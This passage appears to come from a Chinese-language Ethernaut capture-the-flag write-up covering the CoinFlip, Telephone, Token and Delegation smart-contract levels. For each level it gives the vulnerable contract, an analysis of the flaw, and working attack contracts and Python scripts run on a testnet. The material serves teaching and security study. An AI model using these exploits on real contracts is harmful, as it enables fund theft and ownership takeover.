156104975733600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505b565b60008060003373ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1681526020019081526020016000205490509056fea2646970667358221220cd16d6454f4e6ceaf88b209f264a2e4d939b06ca8f160907b1209bd7b91b444164736f6c634300060c0033
+2022-11-14 21:06:55.569 | SUCCESS  | Poseidon.Blockchain:__init__:484 - 
+[Contract][Instantiate]Successfully instantiated contract [0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E].
+2022-11-14 21:06:55.569 | SUCCESS  | Poseidon.Blockchain:EncodeABI:555 - 
+[Contract][EncodeABI]
+[ContractAddress]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
+[Function]contribute()
+[CallData]0xd7bb99ba
+2022-11-14 21:06:56.585 | INFO     | Poseidon.Blockchain:SendTransaction:328 - 
+[Account][SendTransaction][Traditional]
+[TransactionHash]0x6832df3d3791f79be6b5ef28e2cf3165b37316d8ae238b22e793c5499f057f41
+[Txn]{
+  &#34;chainId&#34;: 11155111,
+  &#34;from&#34;: &#34;0x7Ebd33D2e0707abD856c86C32D424122D400D9E9&#34;,
+  &#34;to&#34;: &#34;0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E&#34;,
+  &#34;nonce&#34;: 19,
+  &#34;value&#34;: 1,
+  &#34;gasPrice&#34;: &#34;1.800000008 Gwei&#34;,
+  &#34;gas&#34;: 10000000,
+  &#34;data&#34;: &#34;0xd7bb99ba&#34;
+}
+2022-11-14 21:07:00.423 | SUCCESS  | Poseidon.Blockchain:SendTransaction:335 - 
+[Account][SendTransaction][Traditional][Success]
+[TransactionHash]0x6832df3d3791f79be6b5ef28e2cf3165b37316d8ae238b22e793c5499f057f41
+[BlockNumber]2287893
+[From]0x7Ebd33D2e0707abD856c86C32D424122D400D9E9
+[To]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
+[Value]1 [GasUsed]47729
+[Data]0xd7bb99ba
+[Logs][]
+2022-11-14 21:07:01.182 | INFO     | Poseidon.Blockchain:SendTransaction:328 - 
+[Account][SendTransaction][Traditional]
+[TransactionHash]0x7ab6b5d76d3866625a63e99c95e19c65e6f627cdbaf346f4fece247419b8e0a9
+[Txn]{
+  &#34;chainId&#34;: 11155111,
+  &#34;from&#34;: &#34;0x7Ebd33D2e0707abD856c86C32D424122D400D9E9&#34;,
+  &#34;to&#34;: &#34;0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E&#34;,
+  &#34;nonce&#34;: 20,
+  &#34;value&#34;: 1,
+  &#34;gasPrice&#34;: &#34;1.800000008 Gwei&#34;,
+  &#34;gas&#34;: 10000000,
+  &#34;data&#34;: &#34;&#34;
+}
+2022-11-14 21:07:12.457 | SUCCESS  | Poseidon.Blockchain:SendTransaction:335 - 
+[Account][SendTransaction][Traditional][Success]
+[TransactionHash]0x7ab6b5d76d3866625a63e99c95e19c65e6f627cdbaf346f4fece247419b8e0a9
+[BlockNumber]2287894
+[From]0x7Ebd33D2e0707abD856c86C32D424122D400D9E9
+[To]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
+[Value]1 [GasUsed]28302
+[Data]
+[Logs][]
+2022-11-14 21:07:13.183 | INFO     | Poseidon.Blockchain:CallFunction:501 - 
+[Contract][CallFunction]
+[ContractAddress]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
+[Function]withdraw()
+2022-11-14 21:07:13.936 | INFO     | Poseidon.Blockchain:SendTransaction:328 - 
+[Account][SendTransaction][Traditional]
+[TransactionHash]0xa602d32195f479c92d04a6740a594c90514d873cf327c95161cd4ce7b0120beb
+[Txn]{
+  &#34;chainId&#34;: 11155111,
+  &#34;from&#34;: &#34;0x7Ebd33D2e0707abD856c86C32D424122D400D9E9&#34;,
+  &#34;to&#34;: &#34;0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E&#34;,
+  &#34;nonce&#34;: 21,
+  &#34;value&#34;: 0,
+  &#34;gasPrice&#34;: &#34;1.800000008 Gwei&#34;,
+  &#34;gas&#34;: 32619,
+  &#34;data&#34;: &#34;0x3ccfd60b&#34;
+}
+2022-11-14 21:07:24.693 | SUCCESS  | Poseidon.Blockchain:SendTransaction:335 - 
+[Account][SendTransaction][Traditional][Success]
+[TransactionHash]0xa602d32195f479c92d04a6740a594c90514d873cf327c95161cd4ce7b0120beb
+[BlockNumber]2287895
+[From]0x7Ebd33D2e0707abD856c86C32D424122D400D9E9
+[To]0xc80d2089B60231B9D045e985bCB6Fb07Fc8B543E
+[Value]0 [GasUsed]30364
+[Data]0x3ccfd60b
+[Logs][]
+
+
+
+
+
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="coinflip">CoinFlip</h2>
+<h3 id="题目-1">题目</h3>
+<p>目标：<code>consecutiveWins &gt;= 10</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kd">contract</span> <span class="nc">CoinFlip</span> <span class="p">{</span>
+
+  <span class="kt">uint256</span> <span class="k">public</span> <span class="n">consecutiveWins</span><span class="p">;</span>
+  <span class="kt">uint256</span> <span class="n">lastHash</span><span class="p">;</span>
+  <span class="kt">uint256</span> <span class="n">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
+
+  <span class="kd">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nf">flip</span><span class="p">(</span><span class="kt">bool</span> <span class="n">_guess</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kt">uint256</span> <span class="n">blockValue</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">lastHash</span> <span class="o">==</span> <span class="n">blockValue</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nb">revert</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="n">lastHash</span> <span class="o">=</span> <span class="n">blockValue</span><span class="p">;</span>
+    <span class="kt">uint256</span> <span class="n">coinFlip</span> <span class="o">=</span> <span class="n">blockValue</span> <span class="o">/</span> <span class="n">FACTOR</span><span class="p">;</span>
+    <span class="kt">bool</span> <span class="n">side</span> <span class="o">=</span> <span class="n">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">side</span> <span class="o">==</span> <span class="n">_guess</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">consecutiveWins</span><span class="o">++</span><span class="p">;</span>
+      <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="n">consecutiveWins</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+      <span class="k">return</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="题目分析-1">题目分析</h3>
+<p>考点：伪随机数</p>
+<ul>
+<li>以太坊上的所有交易一定是确定性的状态转换操作，并且以一种可计算的方式进行，这意味着没有任何不确定性。所以在区块链上不存在随机性的来源。如果用可以被攻击者控制的变量作为随机数熵源，产生的随机数并不安全。</li>
+<li>在本题中，合约用区块哈希值产生随机数，这意味着我们可以预测随机数达到连续猜对 coin 的 side 的目的。</li>
+</ul>
+<h3 id="解题思路-1">解题思路</h3>
+<p>模拟随机数产生。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kd">contract</span> <span class="nc">Hacker</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="n">instance_address</span> <span class="o">=</span> <span class="mh">0x4A839a697814A172e18e78F46df2515D7989427c</span><span class="p">;</span>
+  <span class="n">CoinFlip</span> <span class="n">c</span> <span class="o">=</span> <span class="n">CoinFlip</span><span class="p">(</span><span class="n">instance_address</span><span class="p">);</span>
+  <span class="kt">uint256</span> <span class="n">FACTOR</span> <span class="o">=</span> <span class="mi">57896044618658097711785492504343953926634992332820282019728792003956564819968</span><span class="p">;</span>
+  <span class="kd">function</span> <span class="nf">exp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="kt">uint256</span> <span class="n">blockValue</span> <span class="o">=</span> <span class="kt">uint256</span><span class="p">(</span><span class="nb">blockhash</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">number</span><span class="o">-</span><span class="mi">1</span><span class="p">));</span>
+    <span class="kt">uint256</span> <span class="n">coinFlip</span> <span class="o">=</span> <span class="n">blockValue</span> <span class="o">/</span> <span class="n">FACTOR</span><span class="p">;</span>
+    <span class="kt">bool</span> <span class="n">side</span> <span class="o">=</span> <span class="n">coinFlip</span> <span class="o">==</span> <span class="mi">1</span> <span class="o">?</span> <span class="kc">true</span> <span class="o">:</span> <span class="kc">false</span><span class="p">;</span>
+    <span class="n">c</span><span class="p">.</span><span class="n">flip</span><span class="p">(</span><span class="n">side</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>调用10次<code>exp()</code>即可。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="s2">&#34;https://rpc.sepolia.org&#34;</span><span class="p">)</span>
+<span class="n">account</span> <span class="o">=</span> <span class="n">Account</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span> <span class="s2">&#34;private key&#34;</span><span class="p">)</span>
+<span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">BlockchainUtils</span><span class="o">.</span><span class="n">Compile</span><span class="p">(</span><span class="s2">&#34;coinflip.sol&#34;</span><span class="p">,</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">)</span>
+<span class="n">contractAddress</span> <span class="o">=</span> <span class="s2">&#34;0x4A839a697814A172e18e78F46df2515D7989427c&#34;</span>
+<span class="c1">#这里要在链上部署我们自己的攻击合约</span>
+<span class="n">Hacker</span> <span class="o">=</span> <span class="n">account</span><span class="o">.</span><span class="n">DeployContract</span><span class="p">(</span><span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">contractAddress</span><span class="p">)[</span><span class="s2">&#34;Contract&#34;</span><span class="p">]</span>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
+	<span class="n">Hacker</span><span class="o">.</span><span class="n">CallFunction</span><span class="p">(</span><span class="s2">&#34;exp&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="telephone">Telephone</h2>
+<h3 id="题目-2">题目</h3>
+<p>目标：成为合约的 owner</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="kd">contract</span> <span class="nc">Telephone</span> <span class="p">{</span>
+
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+
+  <span class="kd">constructor</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nf">changeOwner</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span> <span class="o">!=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="题目分析-2">题目分析</h3>
+<p>考点：<code>tx.origin</code> 和 <code>msg.sender</code> 的区别</p>
+<ul>
+<li><code>tx.origin</code> 指向交易的发起者地址。这个地址一定是账户地址而不是合约地址。</li>
+<li><code>msg.sender</code> 指向函数的直接调用方。这个地址可以是账户地址或合约地址。</li>
+<li>题目中当<code>tx.origin</code>和<code>msg.sender</code>不同时，可以任意修改owner。</li>
+</ul>
+<h3 id="解题思路-2">解题思路</h3>
+<p>尝试创造一个 Hacker 合约来调用<code>changeOwner</code>函数。</p>
+<ul>
+<li>对于 Hacker 合约：<code>tx.origin</code>和<code>msg.sender</code>均为发起交易的账户地址（player）。</li>
+<li>对于 Telephone 合约：<code>tx.origin</code>仍然是发起交易的账户地址，但<code>msg.sender</code>指向直接调用方 Hacker 合约的地址。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="kd">contract</span> <span class="nc">Hacker</span> <span class="p">{</span>
+  <span class="kt">address</span> <span class="n">instance_addr</span> <span class="o">=</span> <span class="mh">0x3A1783388C15c9A977a63763f13A4374c6b691b2</span><span class="p">;</span>
+  <span class="n">Telephone</span> <span class="n">t</span> <span class="o">=</span> <span class="n">Telephone</span><span class="p">(</span><span class="n">instance_addr</span><span class="p">);</span>
+  <span class="kd">function</span> <span class="nf">exp</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">t</span><span class="p">.</span><span class="n">changeOwner</span><span class="p">(</span><span class="nb">tx</span><span class="p">.</span><span class="nb">origin</span><span class="p">);</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="s2">&#34;https://rpc.sepolia.org&#34;</span><span class="p">)</span>
+<span class="n">account</span> <span class="o">=</span> <span class="n">Account</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span> <span class="s2">&#34;key&#34;</span><span class="p">)</span>
+<span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">BlockchainUtils</span><span class="o">.</span><span class="n">Compile</span><span class="p">(</span><span class="s2">&#34;telephone.sol&#34;</span><span class="p">,</span> <span class="s2">&#34;Hacker&#34;</span><span class="p">)</span>
+<span class="n">contractAddress</span> <span class="o">=</span> <span class="s2">&#34;0x3A1783388C15c9A977a63763f13A4374c6b691b2&#34;</span>
+<span class="n">Hacker</span> <span class="o">=</span> <span class="n">account</span><span class="o">.</span><span class="n">DeployContract</span><span class="p">(</span><span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">contractAddress</span><span class="p">)[</span><span class="s2">&#34;Contract&#34;</span><span class="p">]</span>
+
+<span class="n">Hacker</span><span class="o">.</span><span class="n">CallFunction</span><span class="p">(</span><span class="s2">&#34;exp&#34;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="token">Token</h2>
+<h3 id="题目-3">题目</h3>
+<p>目的：初始 player 的 balance 为20。尝试使 player 的 balance 超过20。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="kd">contract</span> <span class="nc">Token</span> <span class="p">{</span>
+
+  <span class="kd">mapping</span><span class="p">(</span><span class="kt">address</span> <span class="o">=&gt;</span> <span class="kt">uint</span><span class="p">)</span> <span class="n">balances</span><span class="p">;</span>
+  <span class="kt">uint</span> <span class="k">public</span> <span class="n">totalSupply</span><span class="p">;</span>
+
+  <span class="kd">constructor</span><span class="p">(</span><span class="kt">uint</span> <span class="n">_initialSupply</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">=</span> <span class="n">totalSupply</span> <span class="o">=</span> <span class="n">_initialSupply</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nf">transfer</span><span class="p">(</span><span class="kt">address</span> <span class="n">_to</span><span class="p">,</span> <span class="kt">uint</span> <span class="n">_value</span><span class="p">)</span> <span class="k">public</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">bool</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nb">require</span><span class="p">(</span><span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-</span> <span class="n">_value</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="n">balances</span><span class="p">[</span><span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">]</span> <span class="o">-=</span> <span class="n">_value</span><span class="p">;</span>
+    <span class="n">balances</span><span class="p">[</span><span class="n">_to</span><span class="p">]</span> <span class="o">+=</span> <span class="n">_value</span><span class="p">;</span>
+    <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nf">balanceOf</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="k">view</span> <span class="k">returns</span> <span class="p">(</span><span class="kt">uint</span> <span class="nb">balance</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="n">balances</span><span class="p">[</span><span class="n">_owner</span><span class="p">];</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="题目分析-3">题目分析</h3>
+<p>考点：整数溢出。</p>
+<ul>
+<li>这里<code>balances</code>使用<code>uint</code>类型，在被减至负数时会下溢变成很大的数。</li>
+<li>可以利用这一点绕过<code>require(balances[msg.sender] - _value &gt;= 0);</code></li>
+</ul>
+<h3 id="解题思路-3">解题思路</h3>
+<p>尝试转出大于20的balance造成整数溢出。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">Poseidon.Blockchain</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">chain</span> <span class="o">=</span> <span class="n">Chain</span><span class="p">(</span><span class="s2">&#34;https://rpc.sepolia.org&#34;</span><span class="p">)</span>
+<span class="n">account</span> <span class="o">=</span> <span class="n">Account</span><span class="p">(</span><span class="n">chain</span><span class="p">,</span> <span class="s2">&#34;key&#34;</span><span class="p">)</span>
+<span class="n">abi</span><span class="p">,</span> <span class="n">bytecode</span> <span class="o">=</span> <span class="n">BlockchainUtils</span><span class="o">.</span><span class="n">Compile</span><span class="p">(</span><span class="s2">&#34;token.sol&#34;</span><span class="p">,</span> <span class="s2">&#34;Token&#34;</span><span class="p">)</span>
+<span class="n">contractAddress</span> <span class="o">=</span> <span class="s2">&#34;0xC2E5F52DF603B0E9EC68D893Ec497eA633362E43&#34;</span>
+<span class="n">contract</span> <span class="o">=</span> <span class="n">Contract</span><span class="p">(</span><span class="n">account</span><span class="p">,</span> <span class="n">contractAddress</span><span class="p">,</span> <span class="n">abi</span><span class="p">)</span>
+<span class="c1"># 这里目标地址只要不是自己就行</span>
+<span class="n">contract</span><span class="o">.</span><span class="n">CallFunction</span><span class="p">(</span><span class="s2">&#34;transfer&#34;</span><span class="p">,</span> <span class="n">contract</span><span class="o">.</span><span class="n">Address</span><span class="p">,</span> <span class="mi">30</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="delegation">Delegation</h2>
+<h3 id="题目-4">题目</h3>
+<p>目的：成为合约的owner</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">6</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
+
+<span class="kd">contract</span> <span class="nc">Delegate</span> <span class="p">{</span>
+
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+
+  <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_owner</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">owner</span> <span class="o">=</span> <span class="n">_owner</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="kd">function</span> <span class="nf">pwn</span><span class="p">()</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">contract</span> <span class="nc">Delegation</span> <span class="p">{</span>
+
+  <span class="kt">address</span> <span class="k">public</span> <span class="n">owner</span><span class="p">;</span>
+  <span class="n">Delegate</span> <span class="n">delegate</span><span class="p">;</span>
+
+  <span class="kd">constructor</span><span class="p">(</span><span class="kt">address</span> <span class="n">_delegateAddress</span><span class="p">)</span> <span class="k">public</span> <span class="p">{</span>
+    <span class="n">delegate</span> <span class="o">=</span> <span class="n">Delegate</span><span class="p">(</span><span class="n">_delegateAddress</span><span class="p">);</span>
+    <span class="n">owner</span> <span class="o">=</span> <span class="nb">msg</span><span class="p">.</span><span class="nb">sender</span><span class="p">;</span>
+  <span class="p">}</span>
+
+  <span class="n">fallback</span><span class="p">()</span> <span class="k">external</span> <span class="p">{</span>
+    <span class="p">(</span><span class="kt">bool</span> <span class="n">result</span><span class="p">,)</span> <span class="o">=</span> <span class="kt">address</span><span class="p">(</span><span class="n">delegate</span><span class="p">).</span><span class="nb">delegatecall</span><span class="p">(</span><span class="nb">msg</span><span class="p">.</span><span class="nb">data</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nb">this</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="题目分析-4">题目分析</h3>
+<p>考点：delegatecall</p>
+<ul>
+<li>Delegatecall 是 solidity 中的一种合约间调用方式。</li>
+<li>与普通函数调用不同的是，Delegatecall 的上下文为调用合约而非被调用合约。</li>
+<li>在本题中，若使 Delegation 合约使用 delegatecall 方法调用 delegate 合约，则<code>msg.sender</code>还是player的账户地址而不是 Delegation 合约地址</li>
+<li>在前文fallback题中应该涉及过，调用合约里的函数的本质是向合约地址发送一笔交易，交易数据（data）为该函数的签名哈希，在<code>Poseidon</code>库中可以用<code>EncodeABI</code>获得这个签名哈希。</li>
+</ul>
+<h3 id="解题思路-4">解题思路</h3>
+<p>考虑向 Delegation 合约发送一笔交易，data为pwn方法的签名哈希。</p>
+<ul>
+<li>Delegation 合约中没有对应的函数方法，触发 fallback 函数。（详见前文Fallback）</li>
+<li><code>msg.data</code>被原样传入 Delegate 合约，等同于进行了一次<code>pwn</code>方法调用，其中<code>msg.sender</code>依然为player的账户地址，完成owner修改。</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
